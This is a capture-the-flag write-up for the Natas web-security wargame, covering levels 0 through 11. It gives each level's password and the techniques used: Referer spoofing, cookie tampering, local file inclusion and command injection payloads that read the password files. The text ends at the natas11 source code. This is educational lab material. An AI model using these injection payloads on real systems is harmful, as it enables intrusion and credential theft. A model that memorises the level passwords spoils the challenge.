# Natas

## natas0
```
natas0:natas0
```
The password to natas1 is found in the HTML source code.<br>

## natas1
```
natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto
```
The password to the next level is also in the source code except this time you have to use CTRL+U.<br>

## natas2
```
natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
```
Looking at the source code, we no longer have any comments but we do have an image in the <b>file</b> directory. Navigating to the directory shows a text file <b>user.txt</b> which contains the flag.

## natas3
```
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```
In the source code, there is a hint:
```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```
Google spiders are constantly crawling over the web. In order for websites to prevent spiders from accessing private resources a text file "robots.txt" is created which shows all resources google shouldn't scan. Navigating to that gives us:
```
User-agent: *
Disallow: /s3cr3t/
```
The directory <b>s3cr3t</b> contains a text file <b>user.txt</b> which contains our flag.

## natas4
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
On the main page, it tells us 
```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```
Which probably means the <b>Referer</b> HTTP header needs to be set to <b>http://natas5.natas.labs.overthewire.org/</b>. Using Burpsuite, you can intercept the HTTP request header and add the <b>Referer</b> field. This gives the flag.

## natas5
```
natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
We are prompted with
```
Access disallowed. You are not logged in
```
Because there is no login form, the user must be authenticated a different way. One of the best ways to track this is with cookies. Checking the cookie jar shows there is a cookie <b>loggedin</b> which is set to 0. Setting <b>loggedin</b> to 1 and refreshing the page gives the flag.

## natas6
```
natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
There is an input field and a <b>view source</b> link which shows the PHP source code for the page. 
```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
This is a simple authentication script which evaluates to true if the POST variable <b>secret</b> is equal to <b>$secret</b>. <b>includes/secret.inc</b> is included into this PHP script. Navigating here gives a blank page however looking at the source code shows the PHP variable <b>$secret</b> as <b>FOEIUWGHFEEUHOFUOIU</b>. Inputting this into the input field gives the flag.

## natas7
```
natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
The main page has two hyperlinks <b>Home</b> and <b>About</b>. Viewing the source gives us a hint:
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
If I navigate to this page a 404 code is returned.<br>
Returning to the main page and clicking on one of the two hyperlinks gives an intereting hyperlink.
```
http://natas7.natas.labs.overthewire.org/index.php?page=about
```
It's clear that this is a <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">Local File Inclusion (LFI)</a> vulnerability. Our payload is:
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
which gives the flag.

## natas8
```
natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```
Again, I am presented with the same input form. Viewing the PHP source gives:
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
The goal is to get the <b>secret</b> POST variable to equivalate to <b>$encodedSecret</b>. The POST variable gets encoded several times. The goal is to reverse the <b>$encodedSecret</b> variable through the three encoded schemes. I use <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to build a "recipe".<br>
Starting with:
```
3d3d516343746d4d6d6c315669563362
```

First we go from Hexadecimal to ASCII.
```
==QcCtmMml1ViV3b
```
Which looks like a reversed Base64 string. We can re-reverse the string and base64 decode which gives.
```
oubWYf2kBq
```
Inputting this into the input field returns the flag.

## natas9
```
natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
This has another input field except this time it looks more like a search bar. Putting in "elite" returns words containing the word "elite". We can view the source code again:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
<a href="https://www.php.net/manual/en/function.passthru.php">passthru</a> is a PHP method which executes system commands. I control the <b>$key</b> variable with the GET variable <b>needle</b>. This is exemplified in the URL:
```
http://natas9.natas.labs.overthewire.org/?needle=elite&submit=Search
```
This seems like an <a href="https://owasp.org/www-community/attacks/Command_Injection">OS Command Injection</a>. We can escape the grep system command by using a semi-colon. Our final payload looks like:
```
; cat /etc/natas_webpass/natas10 #
```
Which gives the flag.

## natas10
```
natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
The web-app is the same as in natas9. We can view the source.
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
This time all of the possible escape characters are blocked so I am forced to work with grep. With grep, you can supply as many files as you want. Our payload is:
```
u /etc/natas_webpass/natas11
```
Which greps the password file<br>

## natas11
```
natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
On the main page we are given a hint
```
Cookies are protected by XOR encryption
```
We can also view the source code:
```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
	    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
	    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
	        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
	        $mydata['showpassword'] = $tempdata['showpassword'];
	        $mydata['bgcolor'] = $tempdata['bgcolor'];
	        }
	    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```